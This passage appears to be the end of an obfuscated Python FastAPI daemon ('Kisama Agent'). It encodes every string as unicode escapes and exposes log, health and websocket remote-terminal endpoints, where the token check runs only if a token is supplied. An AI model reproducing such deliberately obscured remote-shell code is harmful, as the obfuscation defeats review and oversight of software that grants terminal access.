    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_924), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_924)}

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_52(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_53(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'))

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0075\\u006d\\u006d\\u0061\\u0072\\u0079', 'unicode_escape'), response_model=LogSummaryResponse)
async def O0_fn_54(request: Request):

    def O0_fn_55(O0_var_925):
        O0_var_926 = list(O0_var_925)[-10:]
        return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064', 'unicode_escape'): len(O0_var_925), codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0063\\u0061\\u0070\\u0061\\u0063\\u0069\\u0074\\u0079', 'unicode_escape'): Config.MAX_TASK_LOG_SIZE, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): sum((1 for O0_var_927 in O0_var_926 if O0_var_927.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape')) == 0)), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'): sum((1 for O0_var_928 in O0_var_926 if O0_var_928.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'), -1) != 0))}
    return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): O0_fn_55(Config.onetimetasks_log), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): O0_fn_55(Config.crontasks_log)}

@app.get(codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'))
async def O0_fn_56():
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape'): Config.DEBUG, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'): int(time.time()), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION}

@app.get(codecs.decode('\\u002f', 'unicode_escape'))
async def O0_fn_57():
    return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0065\\u006e\\u0064\\u0070\\u006f\\u0069\\u006e\\u0074\\u0073', 'unicode_escape'): {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'): codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073\\u0020\\u0028\\u4ec5\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u0029', 'unicode_escape')}}

@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u0073\\u002f\\u007b\\u0070\\u0061\\u0074\\u0068\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'))
async def O0_fn_58(websocket: WebSocket, path: str, request_id: str=Query(...), token: str=Query(None)):
    O0_var_929 = TerminalSessionHandler()
    O0_var_930 = True
    if token is not None:
        O0_var_930 = False
        O0_var_931 = Config.ws_downgrade_token()
        if not hmac.compare_digest(token.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), O0_var_931.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))):
            await websocket.close(code=1008, reason=codecs.decode('\\u0041\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
            Logger.warning(codecs.decode('\\U0001f6a8\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u8ba4\\u8bc1\\u5931\\u8d25\\uff0c\\u975e\\u6cd5\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\uff01', 'unicode_escape'))
            return
        Logger.info(codecs.decode('\\u2705\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\u0020\\u8ba4\\u8bc1\\u901a\\u8fc7\\u0020\\u0028\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u964d\\u7ea7\\u6a21\\u5f0f\\u0029', 'unicode_escape'))
    await O0_var_929.start_session(websocket, request_id, O0_var_930)

@app.exception_handler(HTTPException)
async def O0_fn_59(request: Request, exc: HTTPException):
    O0_var_932 = {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): exc.detail, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exc.status_code}
    return JSONResponse(status_code=exc.status_code, content=O0_var_932)

class NoSignalsUvicornServer(uvicorn.Server):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u81ea\\u5b9a\\u4e49\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u670d\\u52a1\\u5668\\u7c7b\\u000a\\u0020\\u0020\\u0020\\u0020\\U0001f31f\\u0020\\u6838\\u5fc3\\u6280\\u5de7\\uff1a\\u91cd\\u5199\\u4fe1\\u53f7\\u5b89\\u88c5\\u51fd\\u6570\\u3002\\u76f4\\u63a5\\u0020\\u0070\\u0061\\u0073\\u0073\\u0020\\u6389\\uff0c\\u963b\\u6b62\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u5c1d\\u8bd5\\u5728\\u5b50\\u7ebf\\u7a0b\\u000a\\u0020\\u0020\\u0020\\u0020\\u6ce8\\u518c\\u4e3b\\u7ebf\\u7a0b\\u4e13\\u7528\\u7684\\u7cfb\\u7edf\\u4fe1\\u53f7\\uff08\\u89e3\\u51b3\\u0020\\u0056\\u0061\\u006c\\u0075\\u0065\\u0045\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020\\u0073\\u0065\\u0074\\u005f\\u0077\\u0061\\u006b\\u0065\\u0075\\u0070\\u005f\\u0066\\u0064\\u0020\\u006f\\u006e\\u006c\\u0079\\u0020\\u0077\\u006f\\u0072\\u006b\\u0073\\u0020\\u0069\\u006e\\u0020\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\uff09\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def install_signal_handlers(self) -> None:
        pass

def _start_uvicorn_server(O0_var_933, host, port, log_level):
    O0_var_934 = asyncio.new_event_loop()
    asyncio.set_event_loop(O0_var_934)
    O0_var_935 = uvicorn.Config(app=O0_var_933, host=host, port=port, reload=False, log_level=log_level)
    O0_var_936 = NoSignalsUvicornServer(O0_var_935)
    O0_var_936.run()

def O0_fn_60(blocking: bool=False):
    Config.validate()
    O0_fn_2()
    O0_var_937 = codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape') if Config.DEBUG else codecs.decode('\\u0069\\u006e\\u0066\\u006f', 'unicode_escape')
    if Config.DEBUG:
        Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u5f53\\u524d\\u5904\\u4e8e\\u0020\\u0044\\u0045\\u0042\\u0055\\u0047\\u0020\\u6a21\\u5f0f\\uff0c\\u4f46\\u7531\\u4e8e\\u91c7\\u7528\\u4e86\\u975e\\u963b\\u585e\\u540e\\u53f0\\u6302\\u8f7d\\uff0c\\u5df2\\u81ea\\u52a8\\u5173\\u95ed\\u70ed\\u91cd\\u8f7d\\u0028\\u0052\\u0065\\u006c\\u006f\\u0061\\u0064\\u0029\\u529f\\u80fd\\u3002', 'unicode_escape'))
    Logger.info(codecs.decode('\\u0020\\U0001f680\\u0020\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5f00\\u59cb\\u5728\\u540e\\u53f0\\u5b88\\u62a4\\u7ebf\\u7a0b\\u4e2d\\u542f\\u52a8\\u002e\\u002e\\u002e', 'unicode_escape'))
    O0_var_938 = threading.Thread(target=_start_uvicorn_server, args=(app, Config.HOST, Config.PORT, O0_var_937), daemon=True)
    O0_var_938.start()
    Logger.info(codecs.decode('\\u0020\\u005b\\u002d\\u005d\\u0020\\u540e\\u53f0\\u670d\\u52a1\\u5df2\\u6210\\u529f\\u6302\\u8f7d\\uff0c\\u6b63\\u5728\\u76d1\\u542c\\u7aef\\u53e3\\u003a\\u0020', 'unicode_escape') + str(Config.PORT))
    if blocking:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u6536\\u5230\\u7ec8\\u6b62\\u4fe1\\u53f7\\uff0c\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5b88\\u62a4\\u8fdb\\u7a0b\\u5df2\\u5b89\\u5168\\u9000\\u51fa\\u3002', 'unicode_escape'))

def cli():
    O0_fn_60(blocking=True)
if __name__ == codecs.decode('\\u005f\\u005f\\u006d\\u0061\\u0069\\u006e\\u005f\\u005f', 'unicode_escape'):
    cli()